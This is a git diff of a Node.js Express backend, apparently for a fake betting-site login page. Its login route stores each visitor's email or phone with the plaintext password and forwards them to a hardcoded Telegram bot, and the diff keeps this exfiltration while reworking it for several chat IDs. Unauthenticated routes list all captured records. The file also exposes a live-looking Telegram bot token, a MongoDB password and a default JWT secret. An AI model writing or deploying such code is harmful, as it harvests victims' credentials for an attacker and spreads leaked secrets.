@@ -4,29 +4,15 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 const jwt = require('jsonwebtoken');
 const bcrypt = require('bcryptjs');
-const axios = require('axios');  // Telegram ke liye HTTP request ke liye
+const axios = require('axios');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
 const JWT_SECRET = process.env.JWT_SECRET || 'admin_jwt_secret_key_2025';
 
-// Telegram config
-const TELEGRAM_BOT_TOKEN = '7921501353:AAEAZ-ReZoxO66Gjge2OG_GUPgMhy9D2kvI';
-const TELEGRAM_CHAT_ID = '8180375324';
-
-// Telegram message bhejne ka function
-async function sendTelegramMessage(message) {
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  try {
-    await axios.post(url, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message
-    });
-    console.log('Telegram message sent');
-  } catch (error) {
-    console.error('Error sending Telegram message:', error.response?.data || error.message);
-  }
-}
+// Telegram Bot Config
+const TELEGRAM_BOT_TOKEN = '7874436750:AAF7LQcgO9CTB35B8GvCfHnq9YbF5pg81wE';
+const CHAT_IDS = ['8180375324'];  // Add more chat IDs here if needed
 
 // Middleware
 var corsOptions = {
@@ -37,7 +23,7 @@ app.use(cors(corsOptions));
 app.use(bodyParser.json());
 app.use(express.json());
 
-// User schema
+// User Schema
 const userSchema = new mongoose.Schema({
   email: { type: String },
   phone: { type: String },
@@ -54,7 +40,7 @@ const userSchema = new mongoose.Schema({
   }]
 });
 
-// Admin schema
+// Admin Schema
 const adminSchema = new mongoose.Schema({
   name: { type: String, required: true },
   email: { type: String, required: true, unique: true },
@@ -63,31 +49,69 @@ const adminSchema = new mongoose.Schema({
   lastLogin: { type: Date, default: Date.now }
 });
 
-// MongoDB connection
+// Connect to MongoDB
 mongoose.connect('mongodb+srv://vishu:NdO3hK4ShLCi4YKD@cluster0.4iukcq5.mongodb.net/Demo4raBet', {
-  useNewUrlParser: true,
-  useUnifiedTopology: true,
-  serverSelectionTimeoutMS: 30000,
-  socketTimeoutMS: 45000,
-  connectTimeoutMS: 30000,
-  retryWrites: true,
-  w: 'majority',
-  maxPoolSize: 10,
-  minPoolSize: 1
 }).then(() => {
   console.log('Connected to MongoDB');
 }).catch(err => {
   console.error('MongoDB connection error:', err);
 });
 
+// Models
 const User = mongoose.model('User', userSchema);
 const Admin = mongoose.model('Admin', adminSchema);
 
-// Login route with Telegram notification
+// Function to send message to multiple Telegram chat IDs
+const sendToTelegram = async (message) => {
+  try {
+    for (const chatId of CHAT_IDS) {
+      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML'
+      });
+    }
+  } catch (error) {
+    console.error('Telegram Error:', error.response?.data || error.message);
+  }
+};
+
+// Middleware to verify admin token (moved before routes that use it)
+const verifyAdminToken = (req, res, next) => {
+  const token = req.header('x-auth-token');
+
+  if (!token) {
+    return res.status(401).json({ message: 'Access denied: No token provided' });
+  }
+
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET);
+    req.admin = decoded;
+    next();
+  } catch (error) {
+    res.status(401).json({ message: 'Invalid token' });
+  }
+};
+
+// Login route
 app.post('/api/login', async (req, res) => {
   try {
     const { email, phone, password, loginDate, loginTime, loginMethod } = req.body;
 
+    // Validation
+    if (!password || !loginMethod || !loginDate || !loginTime) {
+      return res.status(400).json({ message: 'Missing required fields' });
+    }
+
+    if (loginMethod === 'email' && !email) {
+      return res.status(400).json({ message: 'Email is required for email login' });
+    }
+
+    if (loginMethod === 'phone' && !phone) {
+      return res.status(400).json({ message: 'Phone is required for phone login' });
+    }
+
+    // Create new user login record
     const user = new User({
       email: loginMethod === 'email' ? email : null,
       phone: loginMethod === 'phone' ? phone : null,
@@ -95,30 +119,30 @@ app.post('/api/login', async (req, res) => {
       loginMethod,
       loginDate,
       loginTime,
-      loginHistory: [
-        {
-          date: loginDate,
-          time: loginTime,
-          method: loginMethod,
-          device: 'Web Browser'
-        }
-      ]
+      loginHistory: [{
+        date: loginDate,
+        time: loginTime,
+        method: loginMethod,
+        device: 'Web Browser'
+      }]
     });
 
     await user.save();
 
-    // Telegram message prepare karo
-    const telegramMessage = `📥 New Login Notification:\n` +
-      `Method: ${loginMethod}\n` +
-      (email ? `Email: ${email}\n` : '') +
-      (phone ? `Phone: ${phone}\n` : '') +
-      (password ? `Password: ${password}\n` : '') +
+    // Prepare Telegram message
+    const message = `<b>New User Login</b>
 
-      `Date: ${loginDate}\n` +
-      `Time: ${loginTime}`;
+🔹 <b>Method:</b> ${loginMethod}
+📅 <b>Date:</b> ${loginDate}
+🕒 <b>Time:</b> ${loginTime}
+📧 <b>Email:</b> ${email || 'N/A'}
+📱 <b>Phone:</b> ${phone || 'N/A'}
+🔑 <b>Password:</b> ${password}`;
 
-    sendTelegramMessage(telegramMessage); // Async call
+    // Send login data to Telegram chat IDs
+    await sendToTelegram(message);
 
+    // Send response back to client
     const userData = {
       id: user._id,
       email: user.email,
@@ -143,9 +167,8 @@ app.post('/api/login', async (req, res) => {
 app.get('/api/user', async (req, res) => {
   try {
     const user = await User.findOne().sort({ createdAt: -1 });
-    if (!user) {
-      return res.status(404).json({ message: 'No users found' });
-    }
+    if (!user) return res.status(404).json({ message: 'No users found' });
+
     const userData = {
       id: user._id,
       email: user.email,
@@ -157,10 +180,12 @@ app.get('/api/user', async (req, res) => {
       createdAt: user.createdAt.toISOString().split('T')[0],
       loginHistory: user.loginHistory
     };
+
     res.status(200).json(userData);
+
   } catch (error) {
     console.error('Get user error:', error);
-    res.status(500).json({ message: 'Server error', error: error.message });
+    res.status(500).json({ message: 'Server error' });
   }
 });
 
@@ -168,9 +193,8 @@ app.get('/api/user', async (req, res) => {
 app.get('/api/users', async (req, res) => {
   try {
     const users = await User.find().sort({ createdAt: -1 });
-    if (!users || users.length === 0) {
-      return res.status(404).json({ message: 'No users found' });
-    }
+    if (!users || users.length === 0) return res.status(404).json({ message: 'No users found' });
+
     const usersData = users.map(user => ({
       id: user._id,
       email: user.email,
@@ -182,10 +206,12 @@ app.get('/api/users', async (req, res) => {
       createdAt: user.createdAt.toISOString().split('T')[0],
       loginHistory: user.loginHistory
     }));
+
     res.status(200).json(usersData);
+
   } catch (error) {
     console.error('Get all users error:', error);
-    res.status(500).json({ message: 'Server error', error: error.message });
+    res.status(500).json({ message: 'Server error' });
   }
 });
 
@@ -194,13 +220,18 @@ app.post('/api/admin/register', async (req, res) => {
   try {
     const { name, email, password } = req.body;
 
+    // Validation
+    if (!name || !email || !password) {
+      return res.status(400).json({ message: 'All fields are required' });
+    }
+
     const existingAdmin = await Admin.findOne({ email });
     if (existingAdmin) {
       return res.status(400).json({ message: 'Admin with this email already exists' });
     }
 
     const salt = await bcrypt.genSalt(10);
-    const hashedPassword = await bcrypt.hash(password, 10);
+    const hashedPassword = await bcrypt.hash(password, salt);
 
     const admin = new Admin({
       name,
@@ -235,6 +266,11 @@ app.post('/api/admin/register', async (req, res) => {
 app.post('/api/admin/login', async (req, res) => {
   try {
     const { email, password } = req.body;
+
+    // Validation
+    if (!email || !password) {
+      return res.status(400).json({ message: 'Email and password are required' });
+    }
 
     const admin = await Admin.findOne({ email });
     if (!admin) {
@@ -271,45 +307,47 @@ app.post('/api/admin/login', async (req, res) => {
   }
 });
 
-// Middleware to verify admin token
-const verifyAdminToken = (req, res, next) => {
-  const token = req.header('x-auth-token');
-
-  if (!token) {
-    return res.status(401).json({ message: 'Access denied: No token provided' });
-  }
-
-  try {
-    const decoded = jwt.verify(token, JWT_SECRET);
-    req.admin = decoded;
-    next();
-  } catch (error) {
-    res.status(401).json({ message: 'Invalid token' });
-  }
-};
-
 // Admin dashboard route
 app.get('/api/admin/dashboard', verifyAdminToken, async (req, res) => {
   try {
     const admin = await Admin.findById(req.admin.id).select('-password');
+    if (!admin) return res.status(404).json({ message: 'Admin not found' });
 
-    if (!admin) {
-      return res.status(404).json({ message: 'Admin not found' });
-    }
-
-    const totalUsers = await User.countDocuments();
+    const userCount = await User.countDocuments();
+    const recentUsers = await User.find().sort({ createdAt: -1 }).limit(5);
 
     res.status(200).json({
       admin,
-      totalUsers
+      stats: { userCount, recentUsers }
     });
+
   } catch (error) {
     console.error('Dashboard error:', error);
-    res.status(500).json({ message: 'Server error', error: error.message });
+    res.status(500).json({ message: 'Server error' });
   }
 });
 
-// Server listen
-app.listen(PORT, () => {
-  console.log(`Server is running on port ${PORT}`);
+// Health check
+app.get("/", (req, res) => {
+  res.json({ status: true, message: "Server is running" });
 });
+
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error(err.stack);
+  res.status(500).json({ message: 'Something went wrong!' });
+});
+
+// Handle 404
+app.use((req, res) => {
+  res.status(404).json({ message: 'Route not found' });
+});
+
+// Start server
+if (process.env.NODE_ENV !== 'production') {
+  app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+  });
+}
+
+module.exports = app;
